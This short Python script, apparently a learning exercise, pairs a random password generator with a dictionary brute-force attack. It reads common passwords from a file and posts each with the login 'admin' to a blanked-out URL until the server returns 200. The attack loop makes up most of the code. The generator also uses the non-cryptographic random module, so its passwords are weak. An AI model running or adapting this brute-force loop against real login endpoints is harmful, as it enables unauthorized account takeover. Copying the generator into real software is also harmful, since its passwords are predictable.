import random
import requests


def generate_good_password(length):
    alphabet = 'abcdefghijklmnopqrstuvwxyz'\
               'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\
               '0123456789!@#$%^&*()_+<>?,.'
    # password = ''
    # for i in range(length):
    #     password += random.choice(alphabet)
    # return password
    return ''.join(random.choices(alphabet, k=length))



with open('bad_passwords.txt') as f:
    popular_passwords_data=f.read()
popular_passwords = popular_passwords_data.split('\n')


i = 0
def generate_bad_password():
    global i

    if i>= len(popular_passwords):
        return

    password = popular_passwords[i]
    i += 1
    return password


while True:
    password = generate_bad_password()
    data = {'login': 'admin', 'password': password}
    if password is None:
        break
    
    response = requests.post('????', json=data)
    if response.status_code == 200:
        print('Success')
        break
